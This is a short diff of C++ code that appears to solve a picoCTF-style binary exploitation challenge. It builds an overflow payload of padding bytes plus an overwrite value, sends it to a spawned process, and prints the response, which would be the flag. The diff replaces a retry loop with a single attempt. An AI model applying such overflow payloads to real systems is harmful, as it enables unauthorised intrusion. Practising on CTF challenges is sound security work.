@@ -84,17 +84,15 @@ int main(){
 		}
 	}
 	
-	s += string(16, 'a') + "\xed\x07\x00\x00";
+	s += string(16, 'a') + "\xed\x07";
 	
-	while(t.find("pico") == string::npos){
-		runcmd();
-		t = cmdin();
-		cmdout(s.size());
-		t = cmdin();
-		cmdout(s);
-		t = cmdin();
-		killcmd();
-	}
+	runcmd();
+	t = cmdin();
+	cmdout(s.size() + 2);
+	t = cmdin();
+	cmdout(s);
+	t = cmdin();
+	killcmd();
 	
 	cout << t << endl;
 
